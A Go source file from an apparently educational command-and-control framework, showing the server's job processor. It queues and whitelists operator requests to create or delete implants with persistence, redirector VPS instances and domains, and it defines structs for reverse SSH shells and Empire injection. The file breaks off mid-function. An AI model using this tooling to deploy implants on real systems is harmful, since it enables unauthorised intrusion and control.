//{{{{{{{ Hive Jobs Functions }}}}}}}
//By Rebujacker - Alvaro Folgado Rueda as an open source educative project

package main

import (


	"os/exec"
	"fmt"
	"strings"
	"bytes"
	"time"
	"encoding/json"
    "io/ioutil"
    "encoding/base64"
    "sync"
    "strconv"

)




//The following structs defines JSON commands that will be de-serialized by Hive. They are originated crafted within electronGUI by Ops. 
//JSON Objects created at: ./src/client/electronGUI/components/createforms/forms.js
type CreateImplant struct {
	Offline string `json:"offline"`
    Name string   `json:"name"`
    Ttl string   `json:"ttl"`
    Resptime string   `json:"resptime"`
    Coms string   `json:"coms"`
    ComsParams []string `json:"comsparams"`
    PersistenceOsx string `json:"persistenceosx"`
    PersistenceOsxP string `json:"persistenceosxp"`
    PersistenceWindows string `json:"persistencewindows"`
    PersistenceWindowsP string `json:"persistencewindowsp"`
    PersistenceLin string `json:"persistencelinux"`
    PersistenceLinP string `json:"persistencelinuxp"`
    Redirectors  []Red `json:"redirectors"` //Array of Serialized "Red" JSON Objects Strings
}


type Red struct{
    Vps string `json:"vps"`
    Domain string `json:"domain"`
}

//JSON Objects created at: ./src/client/electronGUI/components/bichito/bichito.js
type InjectEmpire struct {
    Staging string   `json:"staging"`
}

//JSON Objects created at: ./src/client/electronGUI/components/implant/implant.js
type DropImplant struct {
	Implant string   `json:"implant"`
    Staging string   `json:"staging"`
    Os string   `json:"os"`
    Arch string   `json:"arch"`
    Filename string   `json:"filename"`
}

//Deletes
type DeleteImplant struct{
    Name string `json:"name"`
}

type DeleteVps struct{
    Name string `json:"name"`
}

type DeleteDomain struct{
    Name string `json:"name"`
}

type DeleteStaging struct{
    Name string `json:"name"`
}

//Hive Operations
type AddOperator struct {
    Username string   `json:"username"`
    Password string   `json:"password"`
}



/*
Implant Related JSON Objects
*/
//Used to send System Info serialized JSON data from Implants and de-serialize it on Hive.
//Same mappings: ./src/bichito/modules/biterpreter/sysinfo_*.go
type SysInfo struct {
    Pid string  `json:"pid"`
    Arch string  `json:"arch"`
    Os string  `json:"os"`
    OsV string  `json:"osv"`
    Hostname string   `json:"hostname"` 
    Mac string  `json:"mac"`
    User        string   `json:"user"`   
    Privileges string   `json:"privileges"`
}

//Used to send detailed information to Bichito for an Reverse SSH Interaction.
//Same mappings: ./src/bichito/modules/biterpreter/inject_rev_sshShell*.go
type InjectRevSshShellBichito struct {
    Domain string   `json:"domain"`
    Sshkey string   `json:"sshkey"`
    Port string   `json:"port"`
    User string   `json:"user"`
}


/*
Description: Queues for Hive/Bichitos Jobs, two different queues to avoid blocking footholds on long timed Hive Jobs
Flow:
A. Lock the "on-memory" Job slice
B. Queue the Job, and set the "Working" field to false (Because if this function is run at the end of a JobProcessor Iteration, to shows is free)
C. Start another JobProcessor routine with input "true", so it let jobProcessor knows that is being called from an enqueued action
*/
type hiveJobQueue struct {
    mux  sync.RWMutex
    Working bool
    Jobs []*Job
}

var hivejobqueue *hiveJobQueue

func hiveJobFin(){
	var empty = &Job{Pid:"Hive"}
	hivejobqueue.mux.Lock()
	hivejobqueue.Jobs = append(hivejobqueue.Jobs[:0],hivejobqueue.Jobs[1:]...)
	hivejobqueue.Working = false
	hivejobqueue.mux.Unlock()
	if (len(hivejobqueue.Jobs) != 0){
		go jobProcessor(empty,true)
	}

	return
}

type bichitosJobQueue struct {
    mux  sync.RWMutex
    Working bool
    Jobs []*Job
}

var bichitosjobqueue *bichitosJobQueue

func bichitosJobFin(){
	var empty = &Job{Pid:"None",Chid:"B-"}
	bichitosjobqueue.mux.Lock()
	bichitosjobqueue.Jobs = append(bichitosjobqueue.Jobs[:0],bichitosjobqueue.Jobs[1:]...)
	bichitosjobqueue.Working = false
	bichitosjobqueue.mux.Unlock()
	if (len(bichitosjobqueue.Jobs) != 0){
		go jobProcessor(empty,true)
	}

	return
}



/*
Description: Hive Job Processor Function. This function will consume Job objects,escape the inputs, process the parameters and
trigger a target function, and wrap the final result towards the DB or a target Implant.
Flow:
A. Identify is the Job is meant to be: 
	1.Processed by Hive, 
	2.Coming from Redirectors(logs),
	3.From Operators to Implants,
	4.The Jobs that come back from Implants to Hive

(1 & 3) Perform the "Job Queue Handling". This section will be in charge of avoid race conditions between jobs coming from
Implants and Jobs for the Hive to be processed.
	A. Check if JobProcessor routine is being spawned from a Queue Function, if not, add the Job to the queue (In this way with don't re-queue Jobs)
	B. Check if there is another routine for Hove Jobs already working
	C. Get the first Job from the queue and continue

(1) The "Hive Job Switcher". Identify the Hive Job and proceed:
	A. Escape/White-List Inputs for a Hive Job
	B. Trigger the target creation/deletion of resource routine (create Implant, staging, operator...)

(3) The "Implant Sending Job Switcher". Identify the Job against Implants,and 2 different scenarios:
	A. Simply wrap the Job to be sent to the right Implant/Redirector
	B. Special commands that require steps from Hive, before sending the Job to the Implant

(2) For "2" simply process the Redirector Log and save them within DB

(4) For "Implant Receiving Job Switcher". Identify the Job against Implants,and 4 different scenarios:
	A. Process the Job and Update DB with the result
	B. Check-In Bichito within DB
	C. Process Implants Logs
	D. Special situations (persistence, update Implant sysnfo...)

B.This function/woutine will terminate normally or call "JiveJobFin/bichitosJobFin" on defer to keep processing Jobs 
*/

func jobProcessor(jobO *Job,queue bool){

	//On function vars that will be commonly used
	var(
		jStatus error
		jResult error

		cid string
		pid string
		chid string
		job string
		jid string
		parameters string
	)

	//Jobs that come from users to be processed by Hive
	if strings.Contains(jobO.Pid,"Hive"){

		//Hive Job Queue: Put Hive Jobs on a queue to avoid DB Write Locks
		if !queue{
			hivejobqueue.mux.Lock()
			hivejobqueue.Jobs = append(hivejobqueue.Jobs,jobO)
			hivejobqueue.mux.Unlock()
		}
		
		//If working within another routine, just kill this one,if not set the queue field on "Working"
		if (hivejobqueue.Working){
			return
		}else{
			hivejobqueue.mux.Lock()
			hivejobqueue.Working = true
			hivejobqueue.mux.Unlock()	
		}

		//Defer so Job Processor is closed with the Queue function properly
		defer hiveJobFin()

    	//Don't add/Remove Parameters in the Job Log to avoid unnecessary secrets logging
    	parameters := hivejobqueue.Jobs[0].Parameters
    	hivejobqueue.Jobs[0].Parameters = "" 

    	//check redundant Jid, if JID exists, log the error
    	errJ := addJobDB(hivejobqueue.Jobs[0])
    	if errJ != nil {
        	//ErrorLog
        	time := time.Now().Format("02/01/2006 15:04:05 MST")
        	elog := fmt.Sprintf("%s%s","Jobs(Job Already Processed):",errJ.Error())
        	go addLogDB("Hive",time,elog)
        	return
    	}

    	//Since Processing the Job can take a time, set the status to processing
   		errS := setJobStatusDB(hivejobqueue.Jobs[0].Jid,"Processing")
    	if errS != nil {
        	//ErrorLog
       		time := time.Now().Format("02/01/2006 15:04:05 MST")
        	elog := fmt.Sprintf("%s%s","Jobs(Error Setting Job Status to Processing):",errS.Error())
        	go addLogDB("Hive",time,elog)
        	return
    	}

    	//Extract Job params from the first element of the queue
		cid = hivejobqueue.Jobs[0].Cid
		pid = hivejobqueue.Jobs[0].Pid
		chid = hivejobqueue.Jobs[0].Chid
		jid = hivejobqueue.Jobs[0].Jid
		job = hivejobqueue.Jobs[0].Job	
		jobO = hivejobqueue.Jobs[0]

		//"Hive Job Switcher"
		switch job{
			/* 
			These Hive to process commands have a common pattern:
			A. Their objective: Create or delete Resources (Implants,VPS,Stagings,Operators...)
			B. Decode the Json-Job Body towards the right Command-Object. JSON is used here since there is a lot of inner parameters.
			C. White-List every string decoded (Not escaping Persistence params yet)
			D. Forcreating resources, check if it exists, if not, start the creation/deletion routine
			Note:
				A lot of these commands have an extra error check to detect DB Lock problems. They will be removed in the future if 
				no more of these errors are generated

			*/
			case "createImplant":
    			jsconcommanA := make([]CreateImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createImplant(Command JSON Decoding Error):"+errD.Error())
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
    			}

    			//Server Side white-list for Hive Commands
    			if !(namesInputWhite(commandO.Name) && numbersInputWhite(commandO.Ttl) && numbersInputWhite(commandO.Resptime) && 
    				 namesInputWhite(commandO.Coms)){

					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createImplant(Implant "+commandO.Name+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}

    			//Decode VPC by type and do formatting check
				switch commandO.Coms{

					case "selfsignedhttpsgo":
						//Check Network Module Parameters formatting
						if !tcpPortInputWhite(commandO.ComsParams[0]) {
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Hive-Create Implant(Paranoid Https TCP Port incorrect)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

							return
						}
							
					case "paranoidhttpsgo":
						//Check Network Module Parameters formatting
						if !tcpPortInputWhite(commandO.ComsParams[0]) {
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Hive-Create Implant(Paranoid Https TCP Port incorrect)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

							return
						}

					//TO-DO: No Escaping for the moment
					case "gmailgo":
					case "gmailmimic":


					default:
						jStatus = setJobStatusDB(jid,"Error")
						jResult = setJobResultDB(jid,"Hive-Create Implant(Netowrk Module yet not Implemented)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

						return
				}

				existV,_ := existImplantDB(commandO.Name)
				if existV{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createImplant(Implant "+commandO.Name+" Already exists)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
				}

				errI := createImplant(commandO.Offline,commandO.Name,commandO.Ttl,commandO.Resptime,commandO.Coms,commandO.ComsParams,commandO.PersistenceOsx,commandO.PersistenceOsxP,commandO.PersistenceWindows,commandO.PersistenceWindowsP,commandO.PersistenceLin,commandO.PersistenceLinP,commandO.Redirectors)
				
				if errI != ""{
					removeImplant(commandO.Name)
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createImplant("+errI+")")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
				}else{
					jStatus = setJobStatusDB(jid,"Success")
					jResult = setJobResultDB(jid,"Hive-createImplant("+commandO.Name+" created)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
				}
			case "deleteImplant":
    			jsconcommanA := make([]DeleteImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteImplant("+commandO.Name+" created)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
    			}

    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteImplant(Implant "+commandO.Name+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
    			}

				existI,_ := existImplantDB(commandO.Name)
				if !existI{
					jStatus = setJobStatusDB(jid,"Error:Hive-deleteImplant(Implant Not in DB)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					return
				}

				err := removeImplant(commandO.Name)
				if err != "Done"{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Error:Hive-deleteImplant("+err+")")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
				}
				jStatus = setJobStatusDB(jid,"Success")
				jResult = setJobResultDB(jid,"Hive-deleteImplant(Implant "+commandO.Name+" Deleted)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
				return

			case "createVPS":

    			resultA := make([]Vps, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&resultA)
    			result := resultA[0]
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"createVPS(VPS JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
    			}


    			//Decode VPC by type and do formatting check, this is important because a lot of string data will be used within terraform
				switch result.Vtype{

					case "aws_instance":
						var amazon *Amazon
						errDaws := json.Unmarshal([]byte(result.Parameters), &amazon)
						if errDaws != nil {
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"VPC Add(Amazon Parameters Decoding Error):"+errDaws.Error())
						
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
						}

    					if !(accessKeysInputWhite(result.Name) && accessKeysInputWhite(amazon.Accesskey) && 
    						accessKeysInputWhite(amazon.Secretkey) && accessKeysInputWhite(amazon.Region) && 
    						namesInputWhite(amazon.Sshkeyname) && accessKeysInputWhite(amazon.Ami) && rsaKeysInputWhite(amazon.Sshkey)){
							
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Hive-VPC Add(VPC Amazon Incorrect Param. Formatting)")
						
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
    					}

					default:
						jStatus = setJobStatusDB(jid,"Error")
						jResult = setJobResultDB(jid,"Hive-VPC Add(VPC Type not yet Implemented)")
						
						if (jStatus != nil){
        					time := time.Now().Format("02/01/2006 15:04:05 MST")
        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        					return
						}
						if (jResult != nil){
        					time := time.Now().Format("02/01/2006 15:04:05 MST")
        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        					return
						}
						
				}


				existV,_ := existVpsDB(result.Name)
				if existV{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Error:createVPS(VPS "+result.Name+" Already exists)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
				}

				errAddVps := addVpsDB(&result)
				if (errAddVps != nil){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"createVPS(VPS "+result.Name+" DB Error:"+errAddVps.Error()+")")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
				}

				jStatus = setJobStatusDB(jid,"Success")
				jResult = setJobResultDB(jid,"createVPS(VPS "+result.Name+" Created)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

				return

			case "deleteVPS":
    			
    			jsconcommanA := make([]DeleteVps, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteVPS(Command JSON Decoding Error))")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
    			}

    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteVPC(VPC "+commandO.Name+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
    			}

				existV,_ := existVpsDB(commandO.Name)
				if !existV{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-deleteVPS(VPS not in DB)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
				}

				errRmVps := rmVpsDB(commandO.Name)
				if (errRmVps != nil){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"deleteVPS(VPS "+commandO.Name+" DB Error:"+errRmVps.Error()+")")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
				}


				jStatus = setJobStatusDB(jid,"Success")
				jResult = setJobResultDB(jid,"Hive-deleteVPS(VPS "+commandO.Name+" Deleted)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

				return

			case "createDomain":
    			
				// JSON parse input
    			resultA := make([]Domain, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&resultA)
    			commandO := resultA[0]
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createDomain(JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}

					return
    			}

    			//Decode Domain by type and do formatting check
				switch commandO.Dtype{

					case "godaddy":
						var godaddy *Godaddy
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &godaddy)
						if errDaws != nil {
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Domain Add(Godaddy Parameters Decoding Error):"+errDaws.Error())
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
						}
						if (jResult != nil){
        					time := time.Now().Format("02/01/2006 15:04:05 MST")
        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        					return
						}

							return
						}

    					if !(namesInputWhite(commandO.Name) && domainsInputWhite(commandO.Domain) && 
    						accessKeysInputWhite(godaddy.Domainkey) && accessKeysInputWhite(godaddy.Domainsecret)){
							
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Hive-Domain Add(Domain GoDaddy Incorrect Param. Formatting)")
							
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
    					}

    				case "gmail":
						var gmail *Gmail
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &gmail)
						if errDaws != nil {
							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Domain Add(GoogleParameters Decoding Error):"+errDaws.Error())
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
						}

						//Let's create a fake domain for gmail SAAS so it doesn't give problems on Hive checking auth
						commandO.Domain = commandO.Domain + ".com"
    					if !(namesInputWhite(commandO.Name) && domainsInputWhite(commandO.Domain) && gmailInputWhite(gmail.Creds) && 
    						gmailInputWhite(gmail.Token)){

							jStatus = setJobStatusDB(jid,"Error")
							jResult = setJobResultDB(jid,"Hive-Domain Add(SAAS Gmail Incorrect Param. Formatting)")
							if (jStatus != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        						return
							}
							if (jResult != nil){
        						time := time.Now().Format("02/01/2006 15:04:05 MST")
        						go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        						return
							}

							return
    					}

					default:
						jStatus = setJobStatusDB(jid,"Error")
						jResult = setJobResultDB(jid,"Hive-Domain Add(Domain Type not yet Implemented)")
						if (jStatus != nil){
        					time := time.Now().Format("02/01/2006 15:04:05 MST")
        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        					return
						}
						
						if (jResult != nil){
        					time := time.Now().Format("02/01/2006 15:04:05 MST")
        					go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        					return
						}
				}

				existV,_ := existDomainDB(commandO.Name)
				if existV{
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-createDomain(Domain already exists)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
				}

				errAddDomain := addDomainDB(&commandO)
				if (errAddDomain != nil){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"createDomain(Domain "+commandO.Name+" DB Error:"+errAddDomain.Error()+")")
					if (jStatus != nil){
